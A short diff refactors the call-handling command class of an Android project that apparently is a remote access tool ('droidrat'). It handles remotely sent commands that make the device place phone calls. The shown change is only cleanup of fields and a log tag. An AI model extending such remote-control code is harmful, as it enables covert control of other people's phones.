@@ -10,14 +10,9 @@ import static com.je_chen.droidrat_je.service.command.ProcessCommandService.webs
 
 public class CallCommand extends CommandFather {
 
-    private final String TAG = "Call Event ";
-
-    private Call call;
-
-    private Context context;
+    private final Call call;
 
     public CallCommand(Context context) {
-        this.context = context;
         call = new Call(context);
     }
 
@@ -30,6 +25,7 @@ public class CallCommand extends CommandFather {
     public void processCommand(String command) {
         try {
             String[] rawCommandArray = command.split(" ");
+            String TAG = "Call Event ";
             switch (rawCommandArray[1]) {
                 case "Call":
                     String phoneNumber = rawCommandArray[2];
